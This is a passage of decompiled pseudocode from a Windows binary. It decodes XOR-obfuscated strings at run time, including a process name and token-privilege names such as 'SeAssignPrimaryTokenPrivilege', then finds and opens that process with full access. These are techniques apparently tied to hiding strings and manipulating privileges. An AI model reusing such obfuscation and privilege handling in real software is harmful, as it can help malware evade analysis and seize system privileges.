_QWORD *__fastcall sub_140019230(__int64 a1, char a2)
{
  return sub_140019360((void *)(a1 - 72), a2);
}

//----- (000000014001923C) ----------------------------------------------------
std::exception *__fastcall sub_14001923C(__int64 a1, char a2)
{
  return sub_1400193E0((void *)(a1 - 24), a2);
}

//----- (0000000140019248) ----------------------------------------------------
std::exception *__fastcall sub_140019248(__int64 a1, char a2)
{
  return sub_140019450((void *)(a1 - 24), a2);
}

//----- (0000000140019260) ----------------------------------------------------
_QWORD *__fastcall sub_140019260(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140018850((std::exception *)a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (00000001400192A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400192A0(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400188E0((std::exception *)a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (00000001400192E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400192E0(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140018970((std::exception *)a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140019320) ----------------------------------------------------
_QWORD *__fastcall sub_140019320(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140018A00((std::exception *)a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140019360) ----------------------------------------------------
_QWORD *__fastcall sub_140019360(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi
  __int64 v4; // r8

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400A4FE8;
  *((_QWORD *)a1 + 9) = off_1400A4FF8;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 14) + 4i64) + 112) = &off_1400A5000;
  v4 = *(signed int *)(*((_QWORD *)a1 + 14) + 4i64);
  *(_DWORD *)((char *)a1 + v4 + 108) = v4 - 16;
  sub_140011530(a1);
  v3[16] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();

//----- (00000001400193E0) ----------------------------------------------------
std::exception *__fastcall sub_1400193E0(void *a1, char a2)
{
  std::exception *v2; // rbx
  char v3; // di
  __int64 v4; // rcx

  v2 = (std::exception *)a1;
  v3 = a2;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v4 = *((_QWORD *)a1 + 4);
  if ( v4 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v4 + 32i64))() )
    *((_QWORD *)v2 + 4) = 0i64;
  std::exception::~exception(v2);
  if ( v3 & 1 )
    operator delete((void *)v2);
  return v2;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);

//----- (0000000140019450) ----------------------------------------------------
std::exception *__fastcall sub_140019450(void *a1, char a2)
{
  std::exception *v2; // rbx
  char v3; // di
  __int64 v4; // rcx

  v2 = (std::exception *)a1;
  v3 = a2;
  *(_QWORD *)a1 = &off_1400A4F90;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v4 = *((_QWORD *)a1 + 4);
  if ( v4 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v4 + 32i64))() )
    *((_QWORD *)v2 + 4) = 0i64;
  *(_QWORD *)v2 = &loc_1400A3C88;
  std::exception::~exception(v2);
  if ( v3 & 1 )
    operator delete((void *)v2);
  return v2;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F90: using guessed type __int64 (__fastcall *off_1400A4F90)(void *);

//----- (00000001400194C0) ----------------------------------------------------
void *__fastcall sub_1400194C0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  std::exception::~exception((std::exception *)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);

//----- (00000001400194F0) ----------------------------------------------------
void *__fastcall sub_1400194F0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140034FB0((__int64 **)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140019520) ----------------------------------------------------
void __fastcall sub_140019520(_QWORD *a1)
{
  DWORD v1; // ebp
  _QWORD *v2; // rbx
  unsigned int v3; // edx
  unsigned int v4; // esi
  _DWORD *v5; // rdi
  unsigned __int64 v6; // rax
  signed __int64 v7; // rdi
  _DWORD *v8; // rdx
  _DWORD *v9; // rcx
  DWORD v10; // eax
  unsigned int v11; // [rsp+58h] [rbp+10h]
  __int64 v12; // [rsp+60h] [rbp+18h]

  v1 = 0;
  v2 = a1;
  v12 = 0i64;
  v11 = 0;
  if ( (unsigned int)WTSEnumerateSessionsW(0i64, 0i64, 1i64, &v12, &v11) )
  {
    v3 = v11;
    v4 = 0;
    if ( v11 )
    {
      do
      {
        v5 = (_DWORD *)(v12 + 24i64 * v4);
        if ( !*(_DWORD *)(v12 + 24i64 * v4 + 16) )
        {
          v6 = v2[1];
          if ( (unsigned __int64)v5 >= v6 || *v2 > (unsigned __int64)v5 )
          {
            if ( v6 == v2[2] )
              sub_14001C300(v2, 1ui64);
            v9 = (_DWORD *)v2[1];
            if ( v9 )
              *v9 = *v5;
          }
          else
          {
            v7 = ((signed __int64)v5 - *v2) >> 2;
            if ( v6 == v2[2] )
              sub_14001C300(v2, 1ui64);
            v8 = (_DWORD *)v2[1];
            if ( v8 )
              *v8 = *(_DWORD *)(*v2 + 4 * v7);
          }
          v2[1] += 4i64;
          v10 = GetLastError();
          v3 = v11;
          v1 = v10;
        }
        ++v4;
      }
      while ( v4 < v3 );
    }
    WTSFreeMemory(v12);
  }
  SetLastError(v1);
}
// 140086F28: using guessed type __int64 __fastcall WTSEnumerateSessionsW(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 140086F2E: using guessed type __int64 __fastcall WTSFreeMemory(_QWORD);

//----- (0000000140019640) ----------------------------------------------------
_QWORD *__fastcall sub_140019640(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9E7C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9E7C & 1 )
  {
    v5 = byte_1400D9E79;
  }
  else
  {
    v4 = 69069 * dword_1400D9E48 + 1234567;
    v1 = dword_1400D9E7C | 1;
    dword_1400D9E48 = v4;
    dword_1400D9E7C |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v4;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v5 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v4;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9E79 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9E7C = v1 | 2;
    byte_1400D9E80[0] = v5 ^ 0x63;
    byte_1400D9E81 = (v5 - 1) ^ 0x6F;
    byte_1400D9E82 = (v5 - 2) ^ 0x72;
    byte_1400D9E83 = (v5 - 3) ^ 0x65;
    byte_1400D9E84 = (v5 - 4) ^ 0x2E;
    byte_1400D9E85 = (v5 - 5) ^ 0x65;
    byte_1400D9E86 = (v5 - 6) ^ 0x78;
    byte_1400D9E87 = (v5 - 7) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400D9E79;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9E80[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9E79: using guessed type char byte_1400D9E79;
// 1400D9E7C: using guessed type int dword_1400D9E7C;
// 1400D9E81: using guessed type char byte_1400D9E81;
// 1400D9E82: using guessed type char byte_1400D9E82;
// 1400D9E83: using guessed type char byte_1400D9E83;
// 1400D9E84: using guessed type char byte_1400D9E84;
// 1400D9E85: using guessed type char byte_1400D9E85;
// 1400D9E86: using guessed type char byte_1400D9E86;
// 1400D9E87: using guessed type char byte_1400D9E87;

//----- (0000000140019810) ----------------------------------------------------
char *sub_140019810()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400D9E6C;
  if ( dword_1400D9E6C & 1 )
  {
    v2 = byte_1400D9E6B;
  }
  else
  {
    v1 = 69069 * dword_1400D9E48 + 1234567;
    v0 = dword_1400D9E6C | 1;
    dword_1400D9E48 = v1;
    dword_1400D9E6C |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v1) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v1;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v2 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v1;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9E6B = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400D9E6C = v0 | 2;
    byte_1400D9E70[0] = v2 ^ 0x63;
    byte_1400D9E71 = (v2 - 1) ^ 0x6F;
    byte_1400D9E72 = (v2 - 2) ^ 0x72;
    byte_1400D9E73 = (v2 - 3) ^ 0x65;
  }
  result = byte_1400D9E74;
  if ( !byte_1400D9E74[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400D9E70[v5++];
      v7 = v2 - v4++;
      byte_1400D9E74[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 4 );
  }
  return result;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9E6B: using guessed type char byte_1400D9E6B;
// 1400D9E6C: using guessed type int dword_1400D9E6C;
// 1400D9E71: using guessed type char byte_1400D9E71;
// 1400D9E72: using guessed type char byte_1400D9E72;
// 1400D9E73: using guessed type char byte_1400D9E73;

//----- (0000000140019940) ----------------------------------------------------
_QWORD *__fastcall sub_140019940(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9E5C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9E5C & 1 )
  {
    v5 = byte_1400D9E58;
  }
  else
  {
    v4 = 69069 * dword_1400D9E48 + 1234567;
    v1 = dword_1400D9E5C | 1;
    dword_1400D9E48 = v4;
    dword_1400D9E5C |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v4;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v5 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v4;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9E58 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9E5C = v1 | 2;
    byte_1400D9E60[0] = v5 ^ 0x4D;
    byte_1400D9E61 = (v5 - 1) ^ 0x65;
    byte_1400D9E62 = (v5 - 2) ^ 0x73;
    byte_1400D9E63 = (v5 - 3) ^ 0x73;
    byte_1400D9E64 = (v5 - 4) ^ 0x61;
    byte_1400D9E65 = (v5 - 5) ^ 0x67;
    byte_1400D9E66 = (v5 - 6) ^ 0x65;
    byte_1400D9E67 = (v5 - 7) ^ 0x44;
    byte_1400D9E68 = (v5 - 8) ^ 0x61;
    byte_1400D9E6A = (v5 - 10) ^ 0x61;
    byte_1400D9E69 = (v5 - 9) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xBui64 )
    sub_140004790(Src, 0xBui64, 0i64);
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_WORD *)v6 + 4) = 0;
  *((_BYTE *)v6 + 10) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 11i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 11) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9E60[v9++];
    v12 = byte_1400D9E58 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xB );
  return v3;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9E58: using guessed type char byte_1400D9E58;
// 1400D9E5C: using guessed type int dword_1400D9E5C;
// 1400D9E61: using guessed type char byte_1400D9E61;
// 1400D9E62: using guessed type char byte_1400D9E62;
// 1400D9E63: using guessed type char byte_1400D9E63;
// 1400D9E64: using guessed type char byte_1400D9E64;
// 1400D9E65: using guessed type char byte_1400D9E65;
// 1400D9E66: using guessed type char byte_1400D9E66;
// 1400D9E67: using guessed type char byte_1400D9E67;
// 1400D9E68: using guessed type char byte_1400D9E68;
// 1400D9E69: using guessed type char byte_1400D9E69;
// 1400D9E6A: using guessed type char byte_1400D9E6A;

//----- (0000000140019B40) ----------------------------------------------------
HANDLE __fastcall sub_140019B40(unsigned int *a1)
{
  HANDLE v1; // r12
  char *v2; // rdx
  char *v3; // r8
  char *v4; // rdx
  unsigned int v5; // er14
  unsigned __int64 v6; // rdi
  void **v7; // r13
  unsigned int v8; // er9
  void **v9; // r8
  signed __int64 v10; // r15
  char *v11; // rax
  signed __int64 v12; // r8
  int v13; // ecx
  int v14; // edx
  char *v15; // rax
  __int64 v16; // rdx
  __int64 v17; // rcx
  char *v18; // rbx
  __int64 v19; // rsi
  unsigned __int64 v20; // rax
  char *v21; // rdi
  __int64 v22; // rax
  _QWORD *v23; // rax
  _QWORD *v24; // rax
  _QWORD *v25; // rbx
  _QWORD *v26; // rax
  bool v27; // bl
  unsigned int v29; // [rsp+30h] [rbp-A8h]
  __int64 v30; // [rsp+38h] [rbp-A0h]
  int v31; // [rsp+40h] [rbp-98h]
  __int64 v32; // [rsp+48h] [rbp-90h]
  char v33; // [rsp+50h] [rbp-88h]
  void *v34; // [rsp+98h] [rbp-40h]
  __int64 v35; // [rsp+A8h] [rbp-30h]
  unsigned __int64 v36; // [rsp+B0h] [rbp-28h]
  void *v37; // [rsp+B8h] [rbp-20h]
  __int64 v38; // [rsp+C8h] [rbp-10h]
  unsigned __int64 v39; // [rsp+D0h] [rbp-8h]
  void *Src; // [rsp+D8h] [rbp+0h]
  __int64 v41; // [rsp+E8h] [rbp+10h]
  unsigned __int64 v42; // [rsp+F0h] [rbp+18h]
  void *v43; // [rsp+F8h] [rbp+20h]
  __int64 v44; // [rsp+108h] [rbp+30h]
  unsigned __int64 v45; // [rsp+110h] [rbp+38h]
  void *v46; // [rsp+118h] [rbp+40h]
  __int64 v47; // [rsp+128h] [rbp+50h]
  unsigned __int64 v48; // [rsp+130h] [rbp+58h]
  void *v49; // [rsp+138h] [rbp+60h]
  __int64 v50; // [rsp+148h] [rbp+70h]
  unsigned __int64 v51; // [rsp+150h] [rbp+78h]
  void *v52; // [rsp+158h] [rbp+80h]
  unsigned __int64 v53; // [rsp+170h] [rbp+98h]

  v32 = -2i64;
  v31 = 0;
  v30 = 0i64;
  v29 = 0;
  v1 = 0i64;
  if ( (unsigned int)WTSEnumerateProcessesExW(0i64, &v31, *a1, &v30, &v29) )
  {
    sub_14007C750(&v33);
    sub_140019640(&v34);
    v2 = (char *)&v34;
    if ( v36 >= 0x10 )
      v2 = (char *)v34;
    v3 = &v2[v35];
    v4 = (char *)&v34;
    if ( v36 >= 0x10 )
      v4 = (char *)v34;
    v42 = 7i64;
    v41 = 0i64;
    LOWORD(Src) = 0;
    sub_1400161F0(&Src, v4, v3);
    v5 = 0;
    v6 = v42;
    v7 = (void **)Src;
    v8 = v29;
    if ( v29 )
    {
      do
      {
        v9 = &Src;
        if ( v6 >= 8 )
          v9 = v7;
        v10 = 24i64 * v5;
        v11 = *(char **)(v10 + v30 + 8);
        v12 = (char *)v9 - v11;
        do
        {
          v13 = *(unsigned __int16 *)&v11[v12];
          v14 = *(unsigned __int16 *)v11 - v13;
          if ( *(unsigned __int16 *)v11 != v13 )
            break;
          v11 += 2;
        }
        while ( v13 );
        if ( !v14 )
        {
          v15 = (char *)sub_140019640(&v52);
          v18 = v15;
          v39 = 7i64;
          v38 = 0i64;
          LOWORD(v37) = 0;
          v19 = *((_QWORD *)v15 + 2);
          if ( v19 )
          {
            v20 = *((_QWORD *)v15 + 3);
            if ( v20 < 0x10 )
              v21 = v18;
            else
              v21 = *(char **)v18;
            if ( v20 >= 0x10 )
              v18 = *(char **)v18;
            v22 = sub_140031970(v17, v16);
            sub_140030C60(v18, &v21[v19], &v37, v22);
            v6 = v42;
          }
          v23 = sub_14007A1A0();
          v24 = sub_140003DE0(&v43, v23, &v37);
          v25 = sub_1400054F0(v24, &v46);
          v26 = (_QWORD *)sub_14007CEB0((__int64)&v33, (__int64)&v49, *(_DWORD *)(v10 + v30 + 4));
          v27 = (unsigned int)sub_14000B9E0(v26, v25) == 0;
          if ( v51 >= 0x10 )
            operator delete(v49);
          v51 = 15i64;
          v50 = 0i64;
          LOBYTE(v49) = 0;
          if ( v48 >= 0x10 )
            operator delete(v46);
          v48 = 15i64;
          v47 = 0i64;
          LOBYTE(v46) = 0;
          if ( v45 >= 8 )
            operator delete(v43);
          v45 = 7i64;
          v44 = 0i64;
          LOWORD(v43) = 0;
          if ( v39 >= 8 )
            operator delete(v37);
          v39 = 7i64;
          v38 = 0i64;
          LOWORD(v37) = 0;
          if ( v53 >= 0x10 )
            operator delete(v52);
          if ( v27 )
          {
            v1 = OpenProcess(0x1FFFFFu, 0, *(_DWORD *)(v10 + v30 + 4));
            if ( v1 )
            {
              v8 = v29;
              break;
            }
          }
          v8 = v29;
        }
        ++v5;
      }
      while ( v5 < v8 );
    }
    WTSFreeMemoryExW(0i64, v30, v8);
    if ( v6 >= 8 )
      operator delete(v7);
    if ( v36 >= 0x10 )
      operator delete(v34);
    v36 = 15i64;
    v35 = 0i64;
    LOBYTE(v34) = 0;
    sub_14007C820(&v33);
  }
  return v1;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);
// 140086F3A: using guessed type __int64 __fastcall WTSFreeMemoryExW(_QWORD, _QWORD, _QWORD);
// 140086F40: using guessed type __int64 __fastcall WTSEnumerateProcessesExW(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (0000000140019E80) ----------------------------------------------------
_QWORD *__fastcall sub_140019E80(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9EC4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9EC4 & 1 )
  {
    v5 = byte_1400D9EC0;
  }
  else
  {
    v4 = 69069 * dword_1400D9E48 + 1234567;
    v1 = dword_1400D9EC4 | 1;
    dword_1400D9E48 = v4;
    dword_1400D9EC4 |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v4;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v5 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v4;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9EC0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9EC4 = v1 | 2;
    byte_1400D9EC8[0] = v5 ^ 0x53;
    byte_1400D9EC9 = (v5 - 1) ^ 0x65;
    byte_1400D9ECA = (v5 - 2) ^ 0x41;
    byte_1400D9ECB = (v5 - 3) ^ 0x73;
    byte_1400D9ECC = (v5 - 4) ^ 0x73;
    byte_1400D9ECD = (v5 - 5) ^ 0x69;
    byte_1400D9ECE = (v5 - 6) ^ 0x67;
    byte_1400D9ECF = (v5 - 7) ^ 0x6E;
    byte_1400D9ED0 = (v5 - 8) ^ 0x50;
    byte_1400D9ED1 = (v5 - 9) ^ 0x72;
    byte_1400D9ED2 = (v5 - 10) ^ 0x69;
    byte_1400D9ED3 = (v5 - 11) ^ 0x6D;
    byte_1400D9ED4 = (v5 - 12) ^ 0x61;
    byte_1400D9ED5 = (v5 - 13) ^ 0x72;
    byte_1400D9ED6 = (v5 - 14) ^ 0x79;
    byte_1400D9ED7 = (v5 - 15) ^ 0x54;
    byte_1400D9ED8 = (v5 - 16) ^ 0x6F;
    byte_1400D9ED9 = (v5 - 17) ^ 0x6B;
    byte_1400D9EDA = (v5 - 18) ^ 0x65;
    byte_1400D9EDB = (v5 - 19) ^ 0x6E;
    byte_1400D9EDC = (v5 - 20) ^ 0x50;
    byte_1400D9EDD = (v5 - 21) ^ 0x72;
    byte_1400D9EDE = (v5 - 22) ^ 0x69;
    byte_1400D9EDF = (v5 - 23) ^ 0x76;
    byte_1400D9EE0 = (v5 - 24) ^ 0x69;
    byte_1400D9EE1 = (v5 - 25) ^ 0x6C;
    byte_1400D9EE2 = (v5 - 26) ^ 0x65;
    byte_1400D9EE3 = (v5 - 27) ^ 0x67;
    byte_1400D9EE4 = (v5 - 28) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x1Dui64 )
  {
    sub_140004790(Src, 0x1Dui64, 0i64);
    v5 = byte_1400D9EC0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  *((_DWORD *)v6 + 6) = 0;
  *((_BYTE *)v6 + 28) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 29i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 29) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9EC8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x1D );
  return v3;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9EC0: using guessed type char byte_1400D9EC0;
// 1400D9EC4: using guessed type int dword_1400D9EC4;
// 1400D9EC9: using guessed type char byte_1400D9EC9;
// 1400D9ECA: using guessed type char byte_1400D9ECA;
// 1400D9ECB: using guessed type char byte_1400D9ECB;
// 1400D9ECC: using guessed type char byte_1400D9ECC;
// 1400D9ECD: using guessed type char byte_1400D9ECD;
// 1400D9ECE: using guessed type char byte_1400D9ECE;
// 1400D9ECF: using guessed type char byte_1400D9ECF;
// 1400D9ED0: using guessed type char byte_1400D9ED0;
// 1400D9ED1: using guessed type char byte_1400D9ED1;
// 1400D9ED2: using guessed type char byte_1400D9ED2;
// 1400D9ED3: using guessed type char byte_1400D9ED3;
// 1400D9ED4: using guessed type char byte_1400D9ED4;
// 1400D9ED5: using guessed type char byte_1400D9ED5;
// 1400D9ED6: using guessed type char byte_1400D9ED6;
// 1400D9ED7: using guessed type char byte_1400D9ED7;
// 1400D9ED8: using guessed type char byte_1400D9ED8;
// 1400D9ED9: using guessed type char byte_1400D9ED9;
// 1400D9EDA: using guessed type char byte_1400D9EDA;
// 1400D9EDB: using guessed type char byte_1400D9EDB;
// 1400D9EDC: using guessed type char byte_1400D9EDC;
// 1400D9EDD: using guessed type char byte_1400D9EDD;
// 1400D9EDE: using guessed type char byte_1400D9EDE;
// 1400D9EDF: using guessed type char byte_1400D9EDF;
// 1400D9EE0: using guessed type char byte_1400D9EE0;
// 1400D9EE1: using guessed type char byte_1400D9EE1;
// 1400D9EE2: using guessed type char byte_1400D9EE2;
// 1400D9EE3: using guessed type char byte_1400D9EE3;
// 1400D9EE4: using guessed type char byte_1400D9EE4;

//----- (000000014001A160) ----------------------------------------------------
_QWORD *__fastcall sub_14001A160(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9EA0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9EA0 & 1 )
  {
    v5 = byte_1400D9E9E;
  }
  else
  {
    v4 = 69069 * dword_1400D9E48 + 1234567;
    v1 = dword_1400D9EA0 | 1;
    dword_1400D9E48 = v4;
    dword_1400D9EA0 |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v4;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v5 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v4;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9E9E = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9EA0 = v1 | 2;
    byte_1400D9EA8[0] = v5 ^ 0x53;
    byte_1400D9EA9 = (v5 - 1) ^ 0x65;
    byte_1400D9EAA = (v5 - 2) ^ 0x49;
    byte_1400D9EAB = (v5 - 3) ^ 0x6E;
    byte_1400D9EAC = (v5 - 4) ^ 0x63;
